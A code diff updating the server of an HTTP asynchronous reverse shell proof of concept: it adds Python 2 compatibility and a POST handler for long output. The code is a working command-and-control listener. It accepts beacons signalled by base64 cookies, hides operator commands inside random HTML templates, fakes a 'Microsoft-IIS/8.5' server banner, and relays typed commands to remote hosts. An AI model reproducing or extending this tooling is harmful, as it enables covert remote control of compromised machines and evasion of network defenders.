@@ -4,8 +4,9 @@
 # HTTP ASYNCHRONE REVERSE SHELL
 # Version : 0.1 POC
 # Git : https://github.com/onSec-fr
-
-import http.server, http.server
+#
+# Update by Green-m, support for py3 and py2.
+#
 import ssl
 import os
 import base64
@@ -21,6 +22,14 @@ PORT = 44443
 CERT_FILE = '../server.pem'
 
 PY3 = sys.version_info[0] >= 3
+
+if PY3:
+    import http.server as baseserver
+    import http.server as httpserver
+
+else:
+    import BaseHTTPServer as baseserver
+    import SimpleHTTPServer as httpserver
 
 def debase64ify(bytes_or_str):
     if PY3 and isinstance(bytes_or_str, str):
@@ -49,7 +58,7 @@ def base64ify(bytes_or_str):
 
 
 
-class MyHandler(http.server.BaseHTTPRequestHandler):
+class MyHandler(baseserver.BaseHTTPRequestHandler):
 	
     # Custom headers
     def _set_headers(self):
@@ -76,19 +85,28 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
                     rndtemplate = random.choice([x for x in os.listdir("../templates") if os.path.isfile(os.path.join("../templates", x))])
                     with open("../templates/" + rndtemplate, 'r') as file:
                         outfile = file.read() + encodedCmd
-                    self.wfile.write(outfile.encode())
+                    if PY3:
+                        outfile = outfile.encode()
+                    self.wfile.write(outfile)
                 else:  
-                    #print(base64.b64decode(self.headers['Cookie']))
                     self.send_response(404)
                     self._set_headers()
-                    self.wfile.write("Not found".encode())
+                    
+                    if PY3:
+                        notfound = "Not found".encode()
+                    else:
+                        notfound = "Not found"
+
+                    self.wfile.write(notfound)
             # Client ask for instructions
             elif debase64ify(self.headers['Cookie']) == "ASK":
                 with open('search', 'r') as file:
                     outfile = file.read()
                 self.send_response(200)
                 self._set_headers()
-                self.wfile.write(outfile.encode())
+                if PY3:
+                    outfile = outfile.encode()
+                self.wfile.write(outfile)
                 if (wait == False):
                     InitFile()
             # Client reply with output
@@ -104,13 +122,65 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
 
                     with open('search', 'r') as file:
                         outfile = file.read()
-                    self.wfile.write(outfile.encode())
+
+                    if PY3:
+                        outfile = outfile.encode()
+                    self.wfile.write(outfile)
 
                     CancelWait()
         else:
             self.send_response(404)
             self._set_headers()
-            self.wfile.write("Not found".encode())
+            if PY3:
+                notfound = "Not found".encode()
+            else:
+                notfound = "Not found"
+
+            self.wfile.write(notfound)
+    # 
+    # Serve post, only for too long request, in the body.
+    #
+    def do_POST(self): 
+        if self.path.startswith("/search"):
+            if initConn != False:
+                if debase64ify(self.headers['Cookie']) == "T0L0NG":
+                    if not PY3:
+                        content_length = int(self.headers.getheader('content-length', 0))
+                    else:
+                        content_length = int(self.headers.get('Content-Length'))
+                    resp = self.rfile.read(content_length)[6:]
+                    resp = debase64ify(resp)
+                    print((Colors.LIGHT_WHITE + "\n" + resp + Colors.END))
+                    InitFile()
+                    self.send_response(200)
+                    self._set_headers() 
+
+                    with open('search', 'r') as file:
+                        outfile = file.read()
+                    if PY3:
+                        outfile = outfile.encode()
+                    self.wfile.write(outfile)
+
+                    CancelWait()
+
+            else:  
+                #print(base64.b64decode(self.headers['Cookie']))
+                self.send_response(404)
+                self._set_headers()
+                if PY3:
+                    notfound = "Not found".encode()
+                else:
+                    notfound = "Not found"
+                self.wfile.write(notfound)
+        else:
+            self.send_response(404)
+            self._set_headers()
+            if PY3:
+                notfound = "Not found".encode()
+            else:
+                notfound = "Not found"
+            self.wfile.write(notfound)
+
     # Save logs
     log_file = open('../logs/logs.txt', 'w')
     def log_message(self, format, *args):
@@ -172,7 +242,7 @@ class Colors:
 def start_server():
     global httpd
     print((Colors.BLUE + '[!] Server listening on port ' + str(PORT) + ', waiting connection from client...' + Colors.END))
-    server_class = http.server.HTTPServer
+    server_class = baseserver.HTTPServer
     MyHandler.server_version = "Microsoft-IIS/8.5"
     MyHandler.sys_version = ""
     httpd = server_class(('0.0.0.0', PORT), MyHandler)
@@ -199,7 +269,11 @@ if __name__ == '__main__':
         while (initConn == False):
             pass
         while True:
-            cmd = input("Command> ")
+            if PY3:
+                cmd = input("Command> ")
+            else:
+                cmd = raw_input("Command> ")
+
             wait = True
             print((Colors.BLUE + 'Awaiting response ...' + Colors.END)) 
             encodedCmd = base64ify(cmd)
